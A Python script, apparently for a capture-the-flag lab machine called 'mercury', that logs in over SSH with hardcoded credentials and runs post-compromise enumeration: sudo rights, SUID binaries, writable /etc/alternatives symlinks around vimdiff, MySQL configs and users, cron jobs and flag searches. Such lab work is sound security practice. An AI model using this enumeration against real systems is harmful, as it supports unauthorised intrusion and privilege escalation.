#!/usr/bin/env python3
"""Direct SSH enumeration of mercury target"""
import paramiko

TARGET = "192.168.56.113"
USERNAME = "linuxmaster"
PASSWORD = "mercurymeandiameteris4880km"

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(TARGET, username=USERNAME, password=PASSWORD, timeout=10)

def run(cmd, label=None):
    if label:
        print(f"\n{'='*60}")
        print(f"  {label}")
        print(f"{'='*60}")
    stdin, stdout, stderr = client.exec_command(cmd)
    out = stdout.read().decode().strip()
    err = stderr.read().decode().strip()
    if out:
        print(out)
    if err and "No such" not in err:
        print(f"[ERR] {err}")
    return out

print("[*] Connected as linuxmaster@192.168.56.113")

# 1. Identity
run("whoami && id && hostname", "IDENTITY")

# 2. Sudo access
run("sudo -l 2>&1", "SUDO ACCESS")

# 3. SUID binaries
run("find / -perm /4000 -type f 2>/dev/null", "SUID BINARIES")

# 4. Symlinks in /etc we can write to
run("find /etc -type l -exec ls -la {} \\; 2>/dev/null", "ETC SYMLINKS")

# 5. Writable paths near symlinks
run("ls -la /etc/alternatives/vim /etc/alternatives/vimdiff /usr/bin/vim.basic 2>&1", "VIM SYMLINK CHAIN")

# 6. Check if we can write to /etc/alternatives
run("touch /etc/alternatives/test_write 2>&1 && echo 'WRITABLE' || echo 'NOT WRITABLE'; rm -f /etc/alternatives/test_write", "WRITE TEST /etc/alternatives")

# 7. MySQL status and configs
run("service mysql status 2>&1; cat ~/.my.cnf 2>/dev/null; find /etc/mysql -name '*.cnf' -exec cat {} \\; 2>/dev/null | head -50", "MYSQL STATE & CONFIGS")

# 8. Listening services
run("ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null", "LISTENING SERVICES")

# 9. Home directory details
run("ls -la /home/linuxmaster/hi.sh && cat /home/linuxmaster/hi.sh", "HI.SH CONTENTS")

# 10. Check for flags
run("find /root -type f 2>/dev/null", "ROOT FILES")
run("find / -name 'flag*' -o -name '*root*' -path '*/root/*' 2>/dev/null | head -10", "FLAG SEARCH")

# 11. Cron jobs
run("crontab -l 2>&1; ls -la /etc/cron* 2>/dev/null", "CRON JOBS")

# 12. Environment
run("env | sort", "ENVIRONMENT")

# 13. Check if vimdiff can be exploited
run("which vimdiff && file $(which vimdiff)", "VIMDIFF LOCATION")

# 14. MySQL credentials from webmaster notes
run("mysql -u root -e 'SELECT User, Host FROM mysql.user;' 2>&1 | head -20", "MYSQL USERS")

client.close()
print("\n[+] Enumeration complete.")
